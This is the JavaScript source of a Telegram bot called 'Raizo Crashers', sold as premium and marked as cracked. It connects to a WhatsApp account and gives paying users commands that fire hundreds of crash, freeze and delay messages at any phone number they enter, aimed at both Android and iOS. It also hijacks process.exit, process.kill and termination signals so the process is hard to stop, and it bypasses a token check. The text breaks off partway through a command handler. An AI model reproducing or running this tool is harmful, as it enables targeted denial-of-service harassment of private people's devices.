const PLAxios = require("axios");
const PLChalk = require("chalk");
function requestInterceptor(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
      PLChalk.blue("[Cracked BY @RakaSukaGeisya]") +
        PLChalk.gray(" [AKUN GITHUB DISINI] ➜  " + urlTarget)
    );
  }
  return cfg;
}
function errorInterceptor(error) {
  const nihUrlKlwError = error?.config?.url || "URL tidak diketahui";
  console.error(
    PLChalk.yellow("[YNTKTS] ➜  Failed To Access: " + nihUrlKlwError)
  );
  return Promise.reject(error);
}

PLAxios.interceptors.request.use(requestInterceptor, errorInterceptor);

// Ini Batas Untuk Interceptor Axios nya

const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, argumentsList) {
    console.log("[♟️ ] Eksekusi Selesai");
  },
});

const originalKill = process.kill;
process.kill = function (pid, signal) {
  if (pid === process.pid) {
    console.log("[♟️ ] Eksekusi Selesai");
  } else {
    return originalKill(pid, signal);
  }
};

["SIGINT", "SIGTERM", "SIGHUP"].forEach((signal) => {
  process.on(signal, () => {
    console.log("[♟️ ] Sinyal " + signal + " terdeteksi dan diabaikan");
  });
});

process.on("uncaughtException", (error) => {
  console.log("[♟️ ] uncaughtException: " + error);
});
process.on("unhandledRejection", (reason) => {
  console.log("[♟️ ] unhandledRejection: " + reason);
});
const { Telegraf, Markup, session } = require("telegraf");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const path = require("path");
const fs = require("fs");
const axios = require("axios");
const pino = require("pino");
const moment = require("moment-timezone");
const chalk = require("chalk");
const config = require("./config.js");
const { BOT_TOKEN } = require("./config");
const crypto = require("crypto");
const premiumFile = "./premiumuser.json";
const adminFile = "./adminuser.json";
const sessionPath = './session';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);


bot.use(session());
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
//////// Fungsi blacklist user \\\\\\
const blacklist = ["7598130753", "7598130753", "7598130753"];
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
    "https://files.catbox.moe/ry4o91.jpg",
    "https://files.catbox.moe/ry4o91.jpg",
    "https://files.catbox.moe/ry4o91.jpg",
    "https://files.catbox.moe/ry4o91.jpg",
    "https://files.catbox.moe/ry4o91.jpg"
  ];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

/////////// UNTUK MENYIMPAN DATA CD \\\\\\\\\\\\\\
const COOLDOWN_FILE = path.join(__dirname, "bokep", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}



function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}
//////// FUNGSI VALID TOKEN \\\\\\\\\
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/hilalanjay/YAHAHAHAHHAHHH/refs/heads/main/token";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
  const validTokens = await fetchValidTokens();
  if (validTokens && validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.green(`Token anda valid!`));
    const bot = new Telegraf(BOT_TOKEN);
    // ... kode bot lainnya ...
    startBot();
  } else {
    console.log(chalk.red("═══════════════════════════════════════════"));
    console.log(chalk.bold.red("Token Tidak Valid, Dasar Kacung"));
    console.log(chalk.red("═══════════════════════════════════════════"));
    process.exit(1);
  }
}

  console.log(chalk.green(`═══════════════════════════════════════════
                     Token Valid
   ═══════════════════════════════════════════`));
  startBot();

function startBot() {
  console.log(
    chalk.blue(`
┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗┗
`));
  console.log(
    chalk.bold.green(`
═════════════
Succes Login
═════════════
    `));
}

validateToken();

///// --- Koneksi WhatsApp --- \\\\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder, you can change this or remove it
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("creds.update", saveCreds);
  

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`

  ${chalk.green.bold("WHATSAPP TERHUBUNG")}
`)
      );
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(
        chalk.white.bold(`
 ${chalk.red.bold("WHATSAPP TERPUTUS")}
`),
        shouldReconnect
          ? chalk.white.bold(`
 ${chalk.red.bold("HUBUNGKAN ULANG")}
`)
          : ""
      );
      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};
/////==== Tap to reply ====\\\\\\
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("WhatsApp Is Not Connect Please Select Command /addsender...");
    return;
  }
  next();
};

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
// Muat ID owner dan pengguna premium
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
const userId = ctx.from.id;
const chatId = ctx.chat.id;

  if (!isOwner(ctx.from.id)) {
    return ctx.reply("Khusus Owner...");
  }
  next();
};
const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(
      "❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin"
    );
  }
  next();
};
// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("Khusus Premium..");
  }
  next();
};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
  fs.writeFileSync("./admins.json", JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
  try {
    const data = fs.readFileSync("./admins.json");
    adminList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar admin:"), error);
    adminList = [];
  }
};

// -- Fungsi Memuat Daftar Owner
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

////=========MENU UTAMA========\\\\

bot.start(async (ctx) => {
  try {
    const Name = ctx.from.first_name || ctx.from.username || ctx.from.id;

    // ✅ Kirim pesan sambutan (pesan baru, bukan reply)
    await ctx.reply(
      `👋 Selamat datang di *Raizo Crashers*`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Menu", callback_data: "kong" }]
          ]
        }
        // Jangan pakai reply_to_message_id agar ini pesan baru
      }
    );

  } catch (err) {
    console.error("🔥 Error saat /start:", err);

    // Opsional: tangani error 429 dari Telegram
    if (err.response?.error_code === 429) {
      const retry = err.response.parameters?.retry_after || 5;
      await ctx.reply(`❌ Bot sedang overload. Coba lagi dalam ${retry} detik.`, {
        reply_to_message_id: ctx.message.message_id
      });
    } else {
      await ctx.reply("💀 Bot gagal memulai.", {
        reply_to_message_id: ctx.message.message_id
      });
    }
  }
});

// Contoh handler untuk tombol "Menu"

bot.action("back", async (ctx) => {
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
<blockquote>╔─═⊱ 𝗥𝗮𝗶𝘇𝗼 𝗖𝗿𝗮𝘀𝗵𝗲𝗿𝘀 ─═⬡
║⎔ ☇ 𝗔𝘂𝘁𝗵𝗼𝗿 : @RakaSukaGeisya
║⎔ ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
║⎔ ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Vip,Buy Only!
║⎔ ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║⎔ ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║⎔ ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), // ganti dengan fungsi random image kamu
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      { text: "Owner Menu", callback_data: "owner_menu" },
      { text: "⏤͟͟͞͞𝐑𝐚𝐢𝐳𝐨 𝐂𝐫𝐚S⃟ ", callback_data: "bug_menu" }
    ],
    [
      { text: "Thanks", callback_data: "thanks" }
    ],
    [
      { text: "Informasi", url: "https://t.me/LotterInfo" },
      { text: "Dev", url: "https://t.me/LalzzXiterr" }
    ]
  ];

  try {
    await ctx.editMessageMedia(media, {
      reply_markup: { inline_keyboard: mainKeyboard }
    });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard }
    });
  }

  // Audio dihapus dari bagian ini
});
// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();

  const mainMenuMessage = 
  `<blockquote>
╔─═⊱ 𝗥𝗮𝗶𝘇𝗼 𝗖𝗿𝗮𝘀𝗵𝗲𝗿𝘀 ─═⬡
║⎔ ☇ 𝗔𝘂𝘁𝗵𝗼𝗿 : @RakaSukaGeisya
║⎔ ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
║⎔ ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Vip,Buy Only!
║⎔ ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║⎔ ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║⎔ ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢
╔───────( 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 )───────═⬡
║/addprem ☇ id
┃/delprem ☇ id
┃/addadmin ☇ id
┃/deladmin ☇ id
╽/delsesi ☇ id
┃/restart ☇ merestart bot
┃/setjeda ☇ m
┃/addsender number
──────────────────────────▢</blockquote>`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Kembali", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();

  const mainMenuMessage = 
`<blockquote>
╔─═⊱ 𝗥𝗮𝗶𝘇𝗼 𝗖𝗿𝗮𝘀𝗵𝗲𝗿𝘀 ─═⬡
║⎔ ☇ 𝗔𝘂𝘁𝗵𝗼𝗿 : @RakaSukaGeisya
║⎔ ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
║⎔ ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Vip,Buy Only!
║⎔ ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║⎔ ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║⎔ ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢
▢───────( 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂 )───────═⬡
⎔───────────────▢
-ᴛʏᴘᴇ ᴅᴇʟᴀʏ
/RzoInvis ☇ number
  -Delay Invis
/RzoDelay ☇ number
  -Delay Hard
⎔───────────────▢  
-ᴛʏᴘᴇ sᴘᴇᴄɪᴀʟ
/RzoForce ☇ number
  -Force Close 
/RzoFreeze ☇ number
  -Stuck Logo 
/RzoCrash ☇ number
  -Crash WhatsApp
/RzoCombo ☇ number
  -Combo Func
⎔───────────────▢
-ᴛʏᴘᴇ ɪᴏs
/RzoDelayIos ☇ number
  -Ios Delay
/RzoCrashIos ☇ number
  -Crash Ios
⎔───────────────▢  
▢──────────────────────────▢</blockquote>`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Kembali", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

//Permainan
bot.action("permainan", async (ctx) => {
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();

  const mainMenuMessage =
   `<blockquote>
╔─═⊱ 𝗥𝗮𝗶𝘇𝗼 𝗖𝗿𝗮𝘀𝗵𝗲𝗿𝘀 ─═⬡
║⎔ ☇ 𝗔𝘂𝘁𝗵𝗼𝗿 : @RakaSukaGeisya
║⎔ ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
║⎔ ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Vip,Buy Only!
║⎔ ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║⎔ ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║⎔ ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢
▢───────( 𝗚𝗮𝗺𝗲 )───────═⬡
☇ - /TebakNamaLagu
☇ - /TebakKata
☇ - /TebakGambar
☇ - /TebakFoto
☇ - /TebakMerkHp
☇ - /TebakKendaraan
▢──────────────────────────▢
<blockquote>`;

  const media = {
    type: "photo",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Kembali", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk tqto
bot.action("thanks", async (ctx) => {
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();

  const mainMenuMessage =
   `<blockquote>
╔─═⊱ 𝗥𝗮𝗶𝘇𝗼 𝗖𝗿𝗮𝘀𝗵𝗲𝗿𝘀 ─═⬡
║⎔ ☇ 𝗔𝘂𝘁𝗵𝗼𝗿 : @RakaSukaGeisya
║⎔ ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
║⎔ ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Vip,Buy Only!
║⎔ ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║⎔ ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║⎔ ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢
▢───────( 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼 )───────═⬡
-Rakaxyz ☇ Devepeler
-Hamxyz ☇ Friend
-Dapzy ☇ Friend
-Fanz ☇ Friend
-GyzenVtx ☇ Friend
-Allah ☇ My Good
▢──────────────────────────▢</blockquote>`;

  const media = {
    type: "photo",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Kembali", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk back main menu
bot.action("kong", async (ctx) => {
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
<blockquote>╔─═⊱ 𝗥𝗮𝗶𝘇𝗼 𝗖𝗿𝗮𝘀𝗵𝗲𝗿𝘀 ─═⬡
║⎔ ☇ 𝗔𝘂𝘁𝗵𝗼𝗿 : @RakaSukaGeisya
║⎔ ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
║⎔ ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Vip,Buy Only!
║⎔ ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║⎔ ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║⎔ ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), // ganti dengan fungsi random image kamu
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      { text: "Owner Menu", callback_data: "owner_menu" },
      { text: "⏤͟͟͞͞𝐑𝐚𝐢𝐳𝐨 𝐂𝐫𝐚S⃟ ", callback_data: "bug_menu" }
    ],
    [
      { text: "Thanks", callback_data: "thanks" }
    ],
    [
      { text: "Informasi", url: "https://t.me/RakaDeveloper" },
      { text: "Dev", url: "https://t.me/RakaSukaGeisya" }
    ]
  ];

  try {
    await ctx.editMessageMedia(media, {
      reply_markup: { inline_keyboard: mainKeyboard }
    });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard }
    });
  }

  // ✅ Kirim audio hanya di sini (saat tombol "Menu" ditekan)
  try {
    await ctx.replyWithAudio({
      url: "https://files.catbox.moe/74xxcn.mp3",
      title: "Raizo Crashers Sound",
      performer: "RakaSukaGeisya"
    });
  } catch (err) {
    console.error("❌ Gagal kirim audio:", err.message);
  }
});

///////==== CASE BUG 1 ===\\\\\\\
bot.command("RzoCombo", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example : /RzoCombo 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\n Tunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 300; i++) {
    await DelayKenn(sock, target);
    await XProtexBlankXDelay(target);
    await instantcrash(target);
    await DawgyDelay(sock, target);
    await CrashGalaxy(target);
    console.log(chalk.red.bold(`Sukses Sending Combo Sebanyak ${i + 1}/300 Ke ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
//
bot.command("RzoCrash", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example : /RzoCrash 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\n Tunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const targetNumber = q.replace(/[^0-9]/g, "");
  const isTarget = target;
  const mention = [target];
  const show = true;

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 360; i++) {
    await bulldozer(sock, targetNumber);
    await protocolbug5(isTarget, mention);
    await InVisibleX1(target, show);
    await CosmoBlankX(target);
    await ExTraKouta(target);
    await CrashGalaxy(target); 
    await instantcrash(target);
    await DawgyDelay(sock, isTarget);

    console.log(chalk.red.bold(`Sukses Sending Crash Sebanyak ${i + 1}/800 Ke ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
//
bot.command("RzoDelayIos", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example : /RzoDelayIos 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\n Tunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
